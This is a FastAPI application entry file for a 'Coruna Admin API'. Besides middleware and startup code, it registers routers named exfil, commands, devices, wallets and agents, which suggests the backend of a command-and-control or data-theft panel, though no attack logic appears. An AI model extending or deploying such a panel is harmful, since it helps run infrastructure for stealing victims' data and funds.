from contextlib import asynccontextmanager
from pathlib import Path
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
import os

from . import config
from .database import init_db
from .auth import get_or_create_admin
from .limiter import limiter, LIMITER_AVAILABLE

from .routers import (
    auth as auth_router,
    two_factor as two_factor_router,
    report as report_router,
    devices as devices_router,
    exfil as exfil_router,
    commands as commands_router,
    channels as channels_router,
    templates as templates_router,
    wallets as wallets_router,
    dashboard as dashboard_router,
    logs as logs_router,
    audit as audit_router,
    notifications as notifications_router,
    settings as settings_router,
    users as users_router,
    agents as agents_router,
)
from .routers.agent import (
    auth as agent_auth_router,
    devices as agent_devices_router,
    exfil as agent_exfil_router,
    channels as agent_channels_router,
    templates as agent_templates_router,
    dashboard as agent_dashboard_router,
    profile as agent_profile_router,
)


class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        response.headers["X-Frame-Options"] = "SAMEORIGIN"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https: blob:; "
            "connect-src 'self' ws: wss: http://127.0.0.1:8000 http://localhost:8000 http://127.0.0.1:8001 http://localhost:8001 http://127.0.0.1:8080 http://localhost:8080; "
            "font-src 'self' data:; "
            "frame-src 'self' blob: about:; "
            "frame-ancestors 'self';"
        )
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
        return response


FRONTEND_DIST = Path(__file__).resolve().parent.parent / "frontend" / "dist"


@asynccontextmanager
async def lifespan(app: FastAPI):
    import asyncio as _asyncio
    from .database import SessionLocal
    from .routers.notifications import _register_db_factory, register_main_loop
    try:
        register_main_loop(_asyncio.get_running_loop())
    except Exception:
        pass
    _register_db_factory(SessionLocal)
    db = SessionLocal()
    try:
        init_db()
        get_or_create_admin(db)
        from .settings_manager import ensure_default_settings
        ensure_default_settings(db)
    finally:
        db.close()
    yield


app = FastAPI(
    title="Coruna Admin API",
    description="Coruna Management Backend",
    version="1.0.0",
    lifespan=lifespan,
    docs_url="/docs",
    redoc_url="/redoc",
)

if LIMITER_AVAILABLE and limiter is not None:
    app.state.limiter = limiter
    try:
        from slowapi.errors import RateLimitExceeded
        from slowapi.util import get_remote_address
        app.state._rate_limit_remote = get_remote_address

        @app.exception_handler(RateLimitExceeded)
        async def rate_limit_handler(request: Request, exc: RateLimitExceeded):  # noqa: ARG001
            return JSONResponse(
                status_code=429,
                content={"detail": "请求过于频繁，请稍后重试", "error": "rate_limit_exceeded"}
            )
    except Exception:
        pass

app.add_middleware(
    CORSMiddleware,
    allow_origins=config.CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
app.add_middleware(SecurityHeadersMiddleware)


@app.get("/api/health", tags=["system"])
async def health_check():
    return {"status": "ok", "version": "1.0.0"}


app.include_router(auth_router.router)
app.include_router(two_factor_router.router)
app.include_router(report_router.router)
app.include_router(devices_router.router)
app.include_router(exfil_router.router)
app.include_router(commands_router.router)
app.include_router(channels_router.router)
app.include_router(templates_router.router)
app.include_router(wallets_router.router)
app.include_router(dashboard_router.router)
app.include_router(logs_router.router)
app.include_router(audit_router.router)
app.include_router(notifications_router.router)
app.include_router(settings_router.router)
app.include_router(users_router.router)
app.include_router(agents_router.router)

app.include_router(agent_auth_router.router)
app.include_router(agent_devices_router.router)
app.include_router(agent_exfil_router.router)
app.include_router(agent_channels_router.router)
app.include_router(agent_templates_router.router)
app.include_router(agent_dashboard_router.router)
app.include_router(agent_profile_router.router)


if FRONTEND_DIST.exists() and FRONTEND_DIST.is_dir():
    app.mount("/assets", StaticFiles(directory=str(FRONTEND_DIST / "assets")), name="assets")

    @app.get("/{full_path:path}", response_class=HTMLResponse, include_in_schema=False)
    async def serve_frontend(full_path: str):
        if full_path.startswith("api/") or full_path == "docs" or full_path == "redoc" or full_path == "openapi.json":
            from fastapi import HTTPException
            raise HTTPException(status_code=404, detail="Not Found")
        index_html = FRONTEND_DIST / "index.html"
        if index_html.exists():
            return FileResponse(str(index_html), media_type="text/html")
        return HTMLResponse("<h1>Coruna Admin</h1><p>Frontend not built.</p>")
